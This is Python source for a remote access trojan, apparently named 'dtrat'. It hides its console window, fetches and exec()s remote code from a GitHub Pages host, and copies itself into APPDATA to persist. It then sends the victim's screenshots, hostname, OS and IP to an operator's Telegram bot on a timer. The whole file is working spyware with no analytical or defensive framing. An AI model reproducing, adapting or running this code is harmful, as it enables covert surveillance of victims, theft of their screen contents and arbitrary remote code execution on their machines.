# Hide cmd
try:
    import ctypes
    ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )
except:
    pass
# Begin program
import pyautogui
import requests
import time
import os, sys
import platform


def load(url):
    return str(requests.get(url).content.decode("utf-8"))

ip = ""
while ip == "":
    try:
        ip = load("http://ifconfig.me")
    except:
        print("Connection Error: wait 10sec")
        time.sleep(10)
white_list = load("https://dtrat.github.io/dtrat/whitelist-ip.txt?q={}".format(time.time())).split("\n")
inidata = load("https://dtrat.github.io/dtrat/config.ini?q={}".format(time.time()))

exec(load("https://dtrat.github.io/dtrat/load.py?q={}".format(time.time)))

if ip in white_list:
    print("Whitelist detected!")
    if "whitelist" in dir():
        whitelist()
    sys.exit(0)

# Fuck configparser All homies use for loop.
config = {}
sec = ""
for line in inidata.split("\n"):
    if len(line) == 0:
        continue
    if line[0] == "[":
        sec = line[1:-1]
        if sec not in config:
            config[sec] = {}
        continue
    name = line.split("=")[0]
    value = line.split("=")[1]
    config[sec][name] = value

token=config["main"]["token"]
chatid =config["main"]["chatid"]
interval = int(config["main"]["interval"])

caption = "amogus"

def get_screenshot():
    fname = os.environ["TEMP"]+"/"+str(time.time())+".png".replace("\\","/")
    im2 = pyautogui.screenshot(fname)
    return fname

def send_image(fname,caption=caption):
    url='https://api.telegram.org/bot{}/sendPhoto'.format(token)
    files={'photo': open(fname,'rb')}
    values={'chat_id' : chatid , 'caption':caption,'disable_notification': 'true', 'parse_mode':'MarkdownV2'}
    r=requests.post(url,files=files,data=values)

def send_file(fname,caption=caption):
    url='https://api.telegram.org/bot{}/sendDocument'.format(token)
    files={'document': open(fname,'rb')}
    values={'chat_id' : chatid , 'caption':caption,"disable_notification": 'true', 'parse_mode':'MarkdownV2'}
    r=requests.post(url,files=files,data=values)

def send_message(message=caption):
    url='https://api.telegram.org/bot{}/sendMessage'.format(token)
    values={'chat_id' : chatid , 'message':caption,"disable_notification": 'true', 'parse_mode':'MarkdownV2'}
    r=requests.post(url,data=values)
    
def set_interval(new):
    global interval
    interval = new

def define_caption():
    global caption
    caption = "**HOST:** `"+platform.uname()[1]+"`\n" + \
          "**OS:**   `"+str(platform.platform())+"`\n" + \
          "**IP**    `"+ip+"`"

def self_clone(name):
    import shutil
    shutil.copyfile(sys.argv[0], name)

program = os.path.basename(sys.argv[0])
if not os.path.exists(os.environ["APPDATA"]+"/"+program):
    self_clone(os.environ["APPDATA"]+"/"+program)
    if "first_setup" in dir():
        first_setup()
    os.system("start /b cmd /c "+os.environ["APPDATA"]+"/"+program)
    sys.exit(0)

define_caption()
if "setup" in dir():
        setup()

while True:
    if "loop" in dir():
        loop()
    f = get_screenshot()
    send_image(f,caption)
    time.sleep(interval)
